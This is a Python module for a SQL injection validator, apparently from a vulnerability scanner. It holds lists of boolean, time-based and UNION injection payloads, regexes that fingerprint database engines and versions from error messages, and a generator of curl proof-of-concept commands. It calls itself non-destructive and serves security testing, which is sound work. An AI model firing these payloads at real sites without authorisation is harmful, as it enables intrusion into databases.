"""SQL Injection Validation Engine (V5 §7, V4 §21).

Upgraded to E3 Evidence Level:
- Error-based: SQL error detection + database engine identification
- Boolean-based: differential response analysis
- Time-based: timing-based blind detection
- UNION-based: column count detection (non-destructive)
- Database engine fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- Impact matrix generation (C/I/A)
- Professional PoC with curl reproduction command

Does NOT perform destructive database actions or bulk data extraction.
Follows V5 §7: "minimum necessary evidence + clear impact explanation
+ reproducible request + controlled result"
"""

import hashlib
import logging
import re
import time
from dataclasses import dataclass, field
from typing import List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.sqli")

# Safe differential probes (no data modification/extraction)
BOOLEAN_PROBES: List[Tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),       # Classic boolean
    ("' OR 1=1--", "' OR 1=2--"),          # Comment terminator
    ("1 OR 1=1", "1 OR 1=2"),              # Numeric boolean
    ("1) OR (1=1", "1) OR (1=2"),          # Parenthesized
    ("')) OR 1=1--", "')) AND 1=2--"),     # Nested parenthesized (Node/Sequelize)
    ("') OR 1=1--", "') AND 1=2--"),       # Single parenthesized
    ("' OR 'x'='x", "' OR 'x'='y"),       # String comparison
    ("1' AND 1=1#", "1' AND 1=2#"),        # MySQL comment
]

# High-precision time probes: (probe_delay_1, probe_delay_2, probe_zero, delay1, delay2, engine)
TIME_PROBES: List[Tuple[str, str, str, float, float, str]] = [
    ("' OR SLEEP(2)--", "' OR SLEEP(4)--", "' OR SLEEP(0)--", 2.0, 4.0, "MySQL"),
    ("'; WAITFOR DELAY '0:0:2'--", "'; WAITFOR DELAY '0:0:4'--", "'; WAITFOR DELAY '0:0:0'--", 2.0, 4.0, "MSSQL"),
    ("' OR pg_sleep(2)--", "' OR pg_sleep(4)--", "' OR pg_sleep(0)--", 2.0, 4.0, "PostgreSQL"),
    ("' OR RANDOMBLOB(100000000)--", "' OR RANDOMBLOB(200000000)--", "' OR 1=1--", 1.5, 3.0, "SQLite"),
]

# UNION-based column count probes (non-destructive — only determines column count)
UNION_PROBES = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
]

# Error patterns that indicate SQL injection + database engine fingerprinting
SQL_ERROR_PATTERNS = [
    (re.compile(r"(SQL syntax.*?MySQL|mysql_fetch|mysql_num_rows|MySQL server version)", re.I), "MySQL"),
    (re.compile(r"(Warning:.*mysql_|PDOException.*mysql|MySQLi)", re.I), "MySQL"),
    (re.compile(r"(ORA-\d{4,5}|Oracle.*Driver|oracle\.jdbc)", re.I), "Oracle"),
    (re.compile(r"(PG::Error|pg_query\(\)|pg_exec\(\)|PostgreSQL.*ERROR)", re.I), "PostgreSQL"),
    (re.compile(r"(Unclosed quotation mark|Microsoft OLE DB|ODBC SQL Server|mssql_query\(\))", re.I), "MSSQL"),
    (re.compile(r"(sqlite3\.OperationalError|SQLite\/JDBCDriver|System\.Data\.SQLite|SQLITE_ERROR|SQLITE_CORRUPT|near \".*?\": syntax error)", re.I), "SQLite"),
    (re.compile(r"(SequelizeDatabaseError|SequelizeConnectionError|SequelizeValidationError)", re.I), "SQLite/Sequelize"),
    (re.compile(r"(java\.sql\.SQLException|JDBC|Hibernate.*SQL)", re.I), "Unknown"),
    (re.compile(r"(quoted string not properly terminated|syntax error at or near)", re.I), "Unknown"),
    (re.compile(r"(Dynamic SQL Error|SQL command not properly ended)", re.I), "Unknown"),
]

# Database version extraction patterns (from error messages — non-destructive)
DB_VERSION_PATTERNS = {
    "MySQL": re.compile(r"MySQL.*?(\d+\.\d+\.\d+)", re.I),
    "PostgreSQL": re.compile(r"PostgreSQL.*?(\d+\.\d+)", re.I),
    "MSSQL": re.compile(r"Microsoft SQL Server.*?(\d+\.\d+\.\d+)", re.I),
    "Oracle": re.compile(r"Oracle.*?(\d+\.\d+\.\d+)", re.I),
    "SQLite": re.compile(r"SQLite.*?(\d+\.\d+\.\d+)", re.I),
}


@dataclass
class SQLiCandidate:
    url: str
    parameter: str
    location: str
    technique: str  # boolean, error, time, union
    confidence: str = "OBSERVED"
    db_engine: str = "Unknown"
    db_version: str = ""
    column_count: int = 0
    evidence: dict = field(default_factory=dict)
    impact_matrix: dict = field(default_factory=dict)
    poc_curl: str = ""
    reproduction_steps: list = field(default_factory=list)


class SQLiValidator:
    """Controlled SQL Injection validator upgraded to E3 evidence level.

    Pipeline (V5 §7):
        Parameter → Baseline → Controlled differential probe
        → Response comparison → Database engine identification
        → Column count (UNION, non-destructive)
        → Impact demonstration → Evidence → PoC

    Evidence progression:
        Level 1: input changes application/database behavior
        Level 2: controlled validation demonstrates database query manipulation
        Level 3: controlled proof demonstrates unauthorized database-level impact
    """

    def __init__(self, timeout: float = 12.0, max_params: int = 30) -> None:
        self.timeout = timeout
        self.max_params = max_params

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[SQLiCandidate]:
        """Test all parameters for SQL injection vulnerabilities."""
        candidates: List[SQLiCandidate] = []

        for param in parameters[:self.max_params]:
            name = param.get("name", "")
            location = param.get("location", "query")
            if not name or location not in ("query", "body"):
                continue

            # 1. Error-based detection + DB engine fingerprinting
            error_candidate = await self._test_error_based(url, name, location, headers)
            if error_candidate:
                # 1b. Attempt UNION column count for deeper proof (E3)
                if error_candidate.confidence in ("VALIDATED", "CONFIRMED"):
                    column_count = await self._test_union_columns(url, name, location, headers)
                    if column_count > 0:
                        error_candidate.column_count = column_count
                        error_candidate.confidence = "CONFIRMED"
                        error_candidate.evidence["column_count"] = column_count
                        error_candidate.evidence["evidence_level"] = "E3"

                self._enrich_candidate(error_candidate, url, name, location)
                candidates.append(error_candidate)
                continue

            # 2. Boolean-based differential detection
            bool_candidate = await self._test_boolean_based(url, name, location, headers)
            if bool_candidate:
                self._enrich_candidate(bool_candidate, url, name, location)
                candidates.append(bool_candidate)
                continue

            # 3. Time-based blind detection (slower, use last with precision zero-delay control)
            time_candidate = await self._test_time_based(url, name, location, headers)
            if time_candidate:
                self._enrich_candidate(time_candidate, url, name, location)
                candidates.append(time_candidate)

        logger.info("SQLi validation: %d candidates found on %s", len(candidates), url)
        return candidates

    def _enrich_candidate(
        self, candidate: SQLiCandidate, url: str, param: str, location: str
    ) -> None:
        """Add impact matrix, PoC curl, and reproduction steps."""
        candidate.impact_matrix = {
            "confidentiality": "HIGH",
            "integrity": "MEDIUM",
            "availability": "MEDIUM",
            "authentication_bypass": "Possible",
            "data_exposure": "HIGH",
            "lateral_movement": "Low",
            "business_impact": "Unauthorized database-level data access",
        }

        probe = candidate.evidence.get("probe") or candidate.evidence.get("true_probe", "")
        candidate.poc_curl = self._generate_curl(url, param, probe, location)
        candidate.evidence["poc_curl"] = candidate.poc_curl

        candidate.reproduction_steps = [
            f"1. Akses target URL: {url}",
            f"2. Injeksikan payload pada parameter '{param}' ({location})",
            f"3. Payload Terkontrol: {probe}",
            f"4. Jalankan perintah cURL PoC yang valid:\n```bash\n{candidate.poc_curl}\n```",
            f"5. Amati {'pesan kesalahan SQL eksplisit' if candidate.technique == 'error' else 'perubahan perilaku / delay respons basis data'}",
            f"6. Mesin basis data teridentifikasi: {candidate.db_engine}",
        ]
        if candidate.column_count > 0:
            candidate.reproduction_steps.append(
                f"7. Konfirmasi jumlah kolom UNION: {candidate.column_count} kolom"
            )

    async def _send_request(
        self,
        url: str,
        param_name: str,
        value: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[httpx.Response]:
        """Send a request with the given parameter value properly URL-encoded."""
        try:
            async with httpx.AsyncClient(
                timeout=self.timeout,
                follow_redirects=True,
                verify=False,
            ) as client:
                if location == "query":
                    parsed = urlparse(url)
                    base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
                    query_params = parse_qs(parsed.query, keep_blank_values=True)
                    flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}
                    flat_params[param_name] = value
                    return await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    return await client.post(
                        url,
                        data={param_name: value},
                        headers=headers or {},
                    )
        except Exception:
            return None

    async def _test_error_based(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[SQLiCandidate]:
        """Test for SQL error messages in response + database engine fingerprinting."""
        probe = "'"  # Single quote to trigger syntax error
        resp = await self._send_request(url, param_name, probe, location, headers)
        if not resp:
            return None

        body = resp.text
        for pattern, db_engine in SQL_ERROR_PATTERNS:
            match = pattern.search(body)
            if match:
                # Try to extract database version
                db_version = ""
                if db_engine in DB_VERSION_PATTERNS:
                    ver_match = DB_VERSION_PATTERNS[db_engine].search(body)
                    if ver_match:
                        db_version = ver_match.group(1)

                return SQLiCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    technique="error",
                    confidence="VALIDATED",
                    db_engine=db_engine,
                    db_version=db_version,
                    evidence={
                        "probe": probe,
                        "status_code": resp.status_code,
                        "error_pattern": match.group(0)[:200],
                        "db_engine": db_engine,
                        "db_version": db_version or "not_disclosed",
                        "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                        "evidence_level": "E2",
                    },
                )
        return None

    async def _test_boolean_based(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[SQLiCandidate]:
        """Test for boolean-based blind injection via response differential."""
        # Get baseline
        baseline_resp = await self._send_request(url, param_name, "1", location, headers)
        if not baseline_resp:
            return None
        baseline_len = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code

        for true_probe, false_probe in BOOLEAN_PROBES:
            true_resp = await self._send_request(url, param_name, true_probe, location, headers)
            false_resp = await self._send_request(url, param_name, false_probe, location, headers)

            if not true_resp or not false_resp:
                continue

            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            # Significant length differential between TRUE and FALSE conditions
            if (
                true_resp.status_code == baseline_status
                and abs(true_len - baseline_len) < baseline_len * 0.1
                and abs(false_len - baseline_len) > baseline_len * 0.2
            ):
                return SQLiCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    technique="boolean",
                    confidence="SUSPECTED",
                    evidence={
                        "true_probe": true_probe,
                        "false_probe": false_probe,
                        "baseline_length": baseline_len,
                        "true_length": true_len,
                        "false_length": false_len,
                        "length_differential": abs(true_len - false_len),
                        "baseline_status": baseline_status,
                        "true_status": true_resp.status_code,
                        "false_status": false_resp.status_code,
                        "evidence_level": "E1",
                    },
                )
        return None

    async def _test_time_based(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[SQLiCandidate]:
        """Test for time-based blind injection via precision differential response timing and negative zero-delay control."""
        # 1. Capture baseline timing
        t0 = time.monotonic()
        baseline_resp = await self._send_request(url, param_name, "1", location, headers)
        baseline_time = time.monotonic() - t0

        if not baseline_resp:
            return None

        for probe_delay_1, probe_delay_2, probe_zero, delay1, delay2, db_engine in TIME_PROBES:
            # 2. Test negative control (zero delay) — ensures server isn't simply lagging on any payload
            t0 = time.monotonic()
            resp_zero = await self._send_request(url, param_name, probe_zero, location, headers)
            time_zero = time.monotonic() - t0

            if not resp_zero:
                continue

            # If zero-delay probe itself takes too long (> 2x baseline + 1.2s), network is unstable; skip
            if time_zero > baseline_time + 1.2:
                continue

            # 3. Test primary sleep probe (e.g. 2.0s delay)
            t0 = time.monotonic()
            resp1 = await self._send_request(url, param_name, probe_delay_1, location, headers)
            elapsed1 = time.monotonic() - t0

            if resp1 and elapsed1 >= (time_zero + delay1 * 0.8):
                # 4. Verify with double-differential probe (e.g. 4.0s delay)
                t0 = time.monotonic()
                resp2 = await self._send_request(url, param_name, probe_delay_2, location, headers)
                elapsed2 = time.monotonic() - t0

                # Must scale proportionally: elapsed2 must be >= elapsed1 + (delay2 - delay1) * 0.7
                if resp2 and elapsed2 >= (time_zero + delay2 * 0.75) and elapsed2 > elapsed1 + 0.8:
                    return SQLiCandidate(
                        url=url,
                        parameter=param_name,
                        location=location,
                        technique="time",
                        confidence="CONFIRMED",
                        db_engine=db_engine,
                        evidence={
                            "probe": probe_delay_1,
                            "verify_probe": probe_delay_2,
                            "zero_probe": probe_zero,
                            "db_engine": db_engine,
                            "baseline_time_ms": round(baseline_time * 1000),
                            "zero_control_time_ms": round(time_zero * 1000),
                            "delay1_time_ms": round(elapsed1 * 1000),
                            "delay2_time_ms": round(elapsed2 * 1000),
                            "expected_delay1_ms": int(delay1 * 1000),
                            "expected_delay2_ms": int(delay2 * 1000),
                            "status_code": resp1.status_code,
                            "evidence_level": "E3",
                        },
                    )
        return None

    async def _test_union_columns(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> int:
        """Test for UNION SELECT column count (non-destructive)."""
        error_baseline = await self._send_request(url, param_name, "' UNION SELECT 1--", location, headers)
        if not error_baseline:
            return 0

        error_len = len(error_baseline.text)

        for i, probe in enumerate(UNION_PROBES, start=1):
            resp = await self._send_request(url, param_name, probe, location, headers)
            if not resp:
                continue

            resp_len = len(resp.text)
            if resp.status_code == 200 and abs(resp_len - error_len) > error_len * 0.15:
                return i

            is_error = any(
                pattern.search(resp.text)
                for pattern, _ in SQL_ERROR_PATTERNS
            )
            if not is_error and error_baseline.status_code != resp.status_code:
                return i

        return 0

    @staticmethod
    def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
        """Generate valid, syntax-safe, properly encoded curl PoC reproduction command."""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        if location == "query":
            flat_params[param_name] = payload
            query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            final_url = f"{base_url}?{query_str}" if query_str else base_url
            return f"curl -i -s -k -X GET '{final_url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
        else:
            flat_params[param_name] = payload
            data_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            return f"curl -i -s -k -X POST '{base_url}' -d '{data_str}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"


sqli_validator = SQLiValidator()
